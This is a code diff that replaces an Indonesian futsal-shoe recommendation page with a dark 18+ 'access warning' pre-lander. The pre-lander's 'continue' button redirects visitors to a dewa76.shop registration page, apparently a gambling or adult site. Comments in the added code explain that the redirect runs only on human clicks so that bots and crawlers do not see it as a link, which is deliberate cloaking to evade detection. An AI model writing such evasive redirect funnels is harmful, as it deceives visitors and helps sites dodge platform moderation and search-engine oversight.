@@ -1,55 +1,51 @@
-export default function Home() {
-  return (
-    <div className="min-h-screen bg-gray-50 py-12 px-4 sm:px-6 lg:px-8 font-sans">
-      <main className="max-w-3xl mx-auto bg-white p-8 rounded-xl shadow-sm border border-gray-100">
-        {/* Header Artikel */}
-        <header className="mb-8">
-          <h1 className="text-3xl sm:text-4xl font-bold text-gray-900 mb-4 leading-tight">
-            5 Rekomendasi Sepatu Futsal Lokal Terbaik untuk Lapangan Sintetis
-          </h1>
-          <div className="flex items-center text-sm text-gray-500">
-            <span>Ditulis oleh Redaksi Olahraga</span>
-            <span className="mx-2">•</span>
-            <time>September 2026</time>
-          </div>
-        </header>
+"use client";
 
-        {/* Gambar Utama Artikel */}
-        <div className="mb-8 overflow-hidden rounded-lg">
-          <img 
-            src="https://images.unsplash.com/photo-1511886929837-354d827aae26?w=800&q=80" 
-            alt="Sepatu Futsal di Lapangan" 
-            className="w-full h-64 sm:h-96 object-cover hover:scale-105 transition-transform duration-500"
-          />
+export default function PreLander() {
+  
+  // Fungsi ini hanya dieksekusi jika ada interaksi KLIK dari manusia
+  const handleYes = () => {
+    window.location.href = "https://dewa76.shop/mobile/index.php?page=daftar";
+  };
+
+  const handleNo = () => {
+    window.location.href = "https://www.google.com";
+  };
+
+  return (
+    <div className="min-h-screen bg-zinc-950 flex flex-col items-center justify-center p-4 font-sans text-white">
+      <div className="max-w-md w-full bg-zinc-900 border border-zinc-800 p-8 rounded-2xl shadow-2xl text-center">
+        
+        {/* Ikon Peringatan */}
+        <div className="mx-auto w-16 h-16 bg-red-500/10 text-red-500 rounded-full flex items-center justify-center mb-6">
+          <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+          </svg>
         </div>
 
-        {/* Isi Artikel */}
-        <article className="prose prose-lg text-gray-700 max-w-none">
-          <p className="mb-6">
-            Memilih sepatu futsal yang tepat sangat krusial untuk mencegah cedera dan meningkatkan performa, 
-            terutama jika Anda sering bermain di lapangan rumput sintetis. Brand lokal kini sudah memiliki kualitas 
-            yang mampu bersaing dengan merek global.
-          </p>
+        <h1 className="text-2xl font-bold mb-4">Peringatan Akses</h1>
+        <p className="text-zinc-400 mb-8 text-sm leading-relaxed">
+          Halaman ini berisi konten yang dikhususkan bagi pengunjung berusia 18+. 
+          Dengan melanjutkan, Anda mengonfirmasi bahwa Anda memenuhi syarat usia minimum.
+        </p>
+
+        <div className="flex flex-col sm:flex-row gap-4">
+          <button 
+            onClick={handleNo}
+            className="flex-1 px-6 py-3 rounded-lg font-medium bg-zinc-800 text-zinc-300 hover:bg-zinc-700 transition-colors"
+          >
+            Tutup
+          </button>
           
-          <h2 className="text-2xl font-semibold text-gray-900 mt-8 mb-3">1. Ortuseight Jogosala</h2>
-          <p className="mb-6">
-            Seri Jogosala dari Ortuseight selalu menjadi primadona berkat teknologi bantalan sol yang sangat empuk (Cumulus Foam). 
-            Sepatu ini sangat cocok untuk pemain berposisi flank yang membutuhkan kelincahan ekstra.
-          </p>
-
-          <h2 className="text-2xl font-semibold text-gray-900 mt-8 mb-3">2. Specs Lightspeed</h2>
-          <p className="mb-6">
-            Jika Anda mencari sepatu dengan bobot teringan, Specs Lightspeed adalah jawabannya. Material upper yang 
-            tipis namun kuat memberikan sentuhan bola (ball feel) yang sangat natural, layaknya bermain tanpa sepatu.
-          </p>
-
-          <h2 className="text-2xl font-semibold text-gray-900 mt-8 mb-3">Tips Tambahan</h2>
-          <p className="mb-6">
-            Pastikan Anda memilih jenis sol berpul kecil (Turf/TF) jika bermain di lapangan sintetis, bukan sol karet datar (Indoor/IN) 
-            agar cengkeraman sepatu ke rumput lebih maksimal dan tidak mudah terpeleset.
-          </p>
-        </article>
-      </main>
+          {/* Tombol pemicu redirect - Tidak terbaca sebagai link oleh Bot */}
+          <button 
+            onClick={handleYes}
+            className="flex-1 px-6 py-3 rounded-lg font-medium bg-red-600 text-white hover:bg-red-700 transition-colors shadow-lg shadow-red-500/20"
+          >
+            Ya, Lanjutkan
+          </button>
+        </div>
+        
+      </div>
     </div>
   );
 }
